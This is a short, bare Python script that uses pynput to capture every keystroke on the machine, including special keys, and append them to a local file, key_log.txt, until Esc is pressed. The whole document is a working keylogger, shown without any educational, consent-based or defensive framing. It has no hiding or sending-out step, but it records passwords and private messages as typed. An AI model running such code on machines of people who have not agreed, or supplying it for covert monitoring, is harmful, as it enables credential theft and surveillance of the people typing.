from pynput.keyboard import Key, Listener

# Define the log file to store keystrokes
log_file = "key_log.txt"

# Function to log keystrokes to a file
def on_press(key):
    with open(log_file, "a") as f:
        try:
            f.write(f"{key.char}")
        except AttributeError:
            if key == Key.space:
                f.write(" ")
            elif key == Key.enter:
                f.write("\n")
            else:
                f.write(f" [{key}] ")

# Function to handle the key release (optional)
def on_release(key):
    if key == Key.esc:
        # Stop listener on pressing 'Esc'
        return False

# Setting up the listener
with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
     